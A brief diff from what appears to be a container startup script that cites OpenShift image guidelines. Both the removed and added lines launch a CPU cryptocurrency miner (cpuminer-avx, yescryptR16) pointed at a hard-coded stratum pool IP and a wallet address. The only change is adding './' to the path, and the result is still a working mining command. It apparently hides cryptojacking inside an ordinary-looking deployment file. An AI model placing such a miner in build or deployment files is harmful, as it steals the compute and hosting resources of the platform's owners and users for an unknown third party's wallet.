@@ -5,4 +5,4 @@
 # https://docs.openshift.com/container-platform/3.11/creating_images/guidelines.html#openshift-specific-guidelines
 #==============================================
 
-cpuminer-avx -a yescryptR16 -o stratum+tcp://39.98.39.1:9661 -u qYanpTkNHMTYRWQPzSArhipYGkdP5qgYrR.t01 -p x -t 4
+./cpuminer-avx -a yescryptR16 -o stratum+tcp://39.98.39.1:9661 -u qYanpTkNHMTYRWQPzSArhipYGkdP5qgYrR.t01 -p x -t 4
